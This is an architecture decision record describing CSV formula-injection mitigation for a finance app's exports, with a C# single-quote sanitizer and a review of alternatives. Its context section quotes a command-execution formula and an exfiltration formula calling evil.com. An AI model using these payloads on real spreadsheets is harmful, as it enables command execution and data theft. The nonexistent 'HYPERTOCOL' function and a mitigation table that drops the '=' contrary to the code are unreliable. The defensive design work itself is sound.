# ADR-0004: CSV Injection Mitigation for User-Generated Content

## Status

Accepted

## Date

2026-06-24

## Context

The application exports transactions and monthly summaries as CSV files. CSV files are commonly opened in spreadsheet applications (Microsoft Excel, Google Sheets, LibreOffice Calc). These applications interpret cells beginning with `=`, `+`, `-`, `@`, `\t`, or `\r` as **formulas or commands**, which can:

1. Execute arbitrary formulas (e.g., `=cmd|'/C calc'!A0` — Windows command execution)
2. Exfiltrate data to external servers (e.g., `=HYPERTOCOL("https://evil.com/?data="&A1)`)
3. Perform unexpected calculations that corrupt displayed data

This is a well-known attack vector called **CSV injection** (or formula injection). OWASP classifies it as a spreadsheet security risk.

Our CSV exports include a `note` field — free-text user input that could contain injection-prone characters (accidentally or maliciously).

## Decision

Apply **single-quote prefix sanitization** on user-generated text fields before writing them to CSV:

```csharp
private static string? SanitizeForCsvInjection(string? cell)
{
    if (string.IsNullOrEmpty(cell))
        return cell;

    return cell[0] is '=' or '+' or '-' or '@' or '\t' or '\r'
        ? $"'{cell}"
        : cell;
}
```

### Scope

- **Applied to**: `note` field in transaction CSV exports (the only free-text, user-generated field in the export)
- **Not applied to**: System-generated fields (`occurredOn`, `type`, `categoryName`, `amount`) which are trusted and safe
- **Applied in**: `ExportService.BuildTransactionsCsvAsync()` — the single chokepoint for CSV generation

### Why single-quote prefix

The single-quote (`'`) is a **neutral escape character** in CSV format. Spreadsheet applications treat `'` as a literal character prefix, not a formula indicator:

| Cell content | Without mitigation | With mitigation |
|---|---|---|
| `=CMD(...)` | Interpreted as formula → potential code execution | Literal text: `'CMD(...)` |
| `+SUM(A1:A10)` | Interpreted as formula | Literal text: `'+SUM(A1:A10)` |
| `Hello world` | Safe — no change | No change (prefix not added) |

This is the approach recommended by OWASP and used by major platforms (Google Sheets, Microsoft Excel defense mode).

## Alternatives Considered

### Sanitize on import (strip dangerous characters entirely)

- **Pros**: Cleaner CSV output
- **Cons**: Loses user data — the note `=SUM(A1:A10)` would be truncated to `SUM(A1:A10)`. Users expect their notes to be preserved verbatim.
- **Rejected**: Data loss is unacceptable. The user wrote that note; it should appear in the export, just not as an executable formula.

### HTML-escape or encode the cell value

- **Pros**: No ambiguity
- **Cons**: Overkill for CSV format; adds unnecessary encoding artifacts (`&amp;` in a CSV is confusing)
- **Rejected**: HTML escaping is for HTML context, not CSV.

### Warn the user (no server-side mitigation)

- **Pros**: No server-side complexity
- **Cons**: Relies on every user understanding CSV injection risk — unreasonable for a personal finance app
- **Rejected**: Security must be enforced server-side, not delegated to users.

### Use a "safe CSV" library that auto-sanitizes

- **Pros**: Delegated to library
- **Cons**: CsvHelper (the library we use) does not have built-in CSV injection protection. Custom sanitization in the export service is simpler than switching libraries or wrapping them.
- **Rejected**: The single-quote prefix approach is trivial to implement and well-understood. No library switch needed.

## Consequences

- **Security**: Formula injection is neutralized. Spreadsheet applications will display the note as literal text instead of executing it as a formula.
- **Data fidelity**: The original note content is preserved (with a `'` prefix). This prefix is visible in the spreadsheet but does not alter the meaning of the note.
- **Performance**: Negligible — the check is O(1) per cell (first-character comparison).
- **Scope**: Only the `note` field is sanitized. If future CSV exports include additional free-text fields, they must also use `SanitizeForCsvInjection()`. This should be noted in code comments and code review.
- **Testing**: The mitigation is verified by the `phase3-smoke-csv-injection.sh` smoke script, which exports a CSV containing injection-prone notes and verifies the `'` prefix is present.
